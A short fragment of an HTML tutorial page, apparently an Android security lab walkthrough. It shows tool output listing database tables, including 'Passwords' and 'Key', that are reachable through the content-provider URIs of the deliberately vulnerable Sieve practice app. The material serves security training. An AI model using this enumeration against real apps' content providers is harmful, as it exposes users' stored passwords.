</span></span><span style=display:flex><span>  Passwords
</span></span><span style=display:flex><span>  Key
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>Accessible tables <span style=color:#66d9ef>for</span> uri content://com.mwr.example.sieve.DBContentProvider/Keys/:
</span></span><span style=display:flex><span>  android_metadata
</span></span><span style=display:flex><span>  Passwords
</span></span><span style=display:flex><span>  Key
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>Accessible tables <span style=color:#66d9ef>for</span> uri content://com.mwr.example.sieve.DBContentProvider/Passwords/:
</span></span><span style=display:flex><span>  android_metadata
</span></span><span style=display:flex><span>  Passwords
</span></span><span style=display:flex><span>  Key
</span></span></code></pre></div></li></ul></li></ol></article><footer class=book-footer><div class="flex flex-wrap justify-between"></div><script>(function(){function e(e){const t=window.getSelection(),n=document.createRange();n.selectNodeContents(e),t.removeAllRanges(),t.addRange(n)}document.querySelectorAll("pre code").forEach(t=>{t.addEventListener("click",function(){if(window.getSelection().toString())return;e(t.parentElement),navigator.clipboard&&navigator.clipboard.writeText(t.parentElement.textContent)})})})()</script></footer><div class=book-comments></div><label for=menu-control class="hidden book-menu-overlay"></label></div><aside class=book-toc><div class=book-toc-content><nav id=TableOfContents></nav></div></aside></main></body></html>